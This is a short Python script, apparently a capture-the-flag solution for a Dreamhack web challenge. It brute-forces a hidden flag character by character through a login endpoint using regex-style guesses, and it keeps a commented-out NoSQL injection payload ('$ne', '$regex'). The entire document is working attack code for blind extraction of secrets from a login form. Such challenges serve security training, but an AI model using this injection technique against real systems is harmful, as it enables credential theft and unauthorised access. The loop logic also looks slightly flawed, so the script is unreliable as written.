import requests
ascii_letters='9abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678'
def url(password):
#    params={'uid[$ne]':'guest','upw[$regex]':'D.*$'}
    params={'userid':'Apple','password':password}
    r=requests.get('http://host1.dreamhack.games:14519/login?',params=params)
    return r
def comp(flag):
    for i in ascii_letters:
        ch=flag+'['+i+']'
        if "admin" in url(ch).text:
            flag+='['+i+']'
            break
    return i
if __name__=='__main__':
    flag='[D]H{'
    for l in range(1,33):
        flag+=comp(flag)
        print(flag+"}")